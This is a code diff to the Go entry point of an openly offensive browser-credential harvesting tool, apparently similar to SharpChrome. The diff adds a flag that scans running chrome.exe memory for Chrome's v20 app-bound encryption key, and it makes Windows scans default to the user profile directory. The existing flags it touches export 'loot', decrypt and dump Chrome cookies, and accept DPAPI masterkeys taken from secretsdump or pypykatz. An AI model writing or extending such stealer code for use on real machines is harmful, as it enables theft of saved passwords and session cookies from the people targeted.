@@ -24,7 +24,8 @@ func main() {
 		return
 	}
 
-	rootDir := flag.String("path", "/", "Root directory to scan")
+	defaultRoot := defaultRootDir()
+	rootDir := flag.String("path", defaultRoot, "Root directory to scan")
 	outputJSON := flag.Bool("json", false, "Output as JSON")
 	outputCSV := flag.String("csv", "", "Export to CSV file (e.g. -csv loot.csv)")
 	outputTXT := flag.String("txt", "", "Export to TXT file (e.g. -txt loot.txt)")
@@ -44,6 +45,7 @@ func main() {
 	cookiesOut := flag.String("cookies-out", "", "Export decrypted cookies in Netscape format (e.g. -cookies-out cookies.txt)")
 	chromeKey := flag.String("chrome-key", "", "Pre-decrypted Chrome AES key as hex (remote DPAPI — use after offline masterkey decrypt)")
 	dpapiMK := flag.String("dpapi-masterkey", "", "DPAPI masterkey as hex (from secretsdump/pypykatz) — auto-decrypts Chrome Local State blob")
+	v20MemScan := flag.Bool("v20-memscan", false, "Scan chrome.exe process memory for v20 app-bound key (slow — browser must be running)")
 
 	flag.Parse()
 
@@ -64,6 +66,10 @@ func main() {
 	if *chromeV20 {
 		decrypt.EnableAppBoundV20()
 		fmt.Fprintln(os.Stderr, "[!] Chrome v20 app-bound bypass ENABLED (experimental — may crash)")
+	}
+	if *v20MemScan {
+		decrypt.EnableMemScan()
+		fmt.Fprintln(os.Stderr, "[*] Chrome v20 memory scan ENABLED (browser must be running)")
 	}
 
 	// SharpChrome-equivalent features
@@ -167,6 +173,18 @@ func main() {
 	if len(results) == 0 {
 		fmt.Fprintln(os.Stderr, "[*] Scan complete. 0 findings.")
 	}
+}
+
+// defaultRootDir returns a sensible scan root for the current OS.
+// On Windows, default to the Users directory (fast); everywhere else use /.
+func defaultRootDir() string {
+	if runtime.GOOS == "windows" {
+		if home := os.Getenv("USERPROFILE"); home != "" {
+			return home
+		}
+		return `C:\Users`
+	}
+	return "/"
 }
 
 func printBanner() {
